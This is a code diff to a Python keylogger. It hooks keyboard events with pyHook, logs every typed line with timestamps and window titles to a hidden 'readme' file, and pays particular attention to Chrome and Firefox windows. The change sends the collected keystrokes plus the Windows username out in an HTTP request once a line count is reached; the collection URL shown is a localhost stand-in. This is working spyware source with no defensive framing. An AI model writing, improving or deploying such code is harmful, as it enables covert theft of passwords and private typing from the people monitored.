@@ -27,6 +27,7 @@ def OnKeyboardEvent(event):
 
     global currString
     global numLines
+    global MAX_LINES
     #to avoid random characters we dont wan't
     if(event.Key == "Back"):
         if(currString != ''):
@@ -38,14 +39,20 @@ def OnKeyboardEvent(event):
         return True
 
     if(event.Ascii == 13):
-        f = open(os.path.join(SECRET_PATH,'readme'),'a')
-        f.write(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')+" -- "+ currString + NORMALIZER[0:70-len(currString)]+" -- "+event.WindowName+ "\n")
-        f.close()
-        currString = ''
-        numLines = numLines + 1
+
+        if (currString != ''):
+
+            f = open(os.path.join(SECRET_PATH,'readme'),'a')
+            f.write(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')+" -- "+ currString + NORMALIZER[0:70-len(currString)]+" -- "+event.WindowName+ "\n")
+            f.close()
+            currString = ''
+            numLines = numLines + 1
+
+            if(numLines > MAX_LINES):
+                thread.start_new_thread(postToWeb,())
 
         return True
-
+        
     #processName = getProcessName(event.Window)
     processName = "chrome.exe"
     if(processName == "chrome.exe" or processName == "firefox.exe"):
@@ -58,40 +65,32 @@ def postToWeb():
     
     global numLines
     global MAX_LINES
-    connection = False
 
-    while True:
+    try:
+        f = open(os.path.join(SECRET_PATH,'readme'))
+        alldata = f.read()
+        f.close()
+        
+        page = requests.get("http://127.0.0.1?q="+alldata +"&n="+os.getenv('USERNAME'), verify = False)
+        
+        print "Sent data succesfully ~"
+        f = open(os.path.join(SECRET_PATH,'readme'),'w')
+        f.close()
+        numLines = 0
+        MAX_LINES = 5
 
-        if(numLines > MAX_LINES):
+    except:
+        print "Could not connect ~"
+        MAX_LINES = MAX_LINES + 5
 
-            try:
-                connection = True
-                requests.get("https://google.com", verify = False)
-            except:
-                connection = False
-
-            if(connection):
-                f = open(os.path.join(SECRET_PATH,'readme'))
-                alldata = f.read()
-                f.close()
-                f = open(os.path.join(SECRET_PATH,'readme'),'w')
-                f.close()
-
-                page = requests.get("http://127.0.0.1?q="+alldata, verify = False)
-                print "Sent data succesfully ~"
-
-                numLines = 0
-                MAX_LINES = 5
-
-            else:
-                print "Could not connect ~"
-                MAX_LINES = MAX_LINES + 5
+    return
+        
 
 hookManager = pyHook.HookManager()
 hookManager.KeyDown = OnKeyboardEvent
 hookManager.HookKeyboard()
 
-thread.start_new_thread(postToWeb,())
+#thread.start_new_thread(postToWeb,())
 # to avoid keyboard interrupt
 while True:
     try:
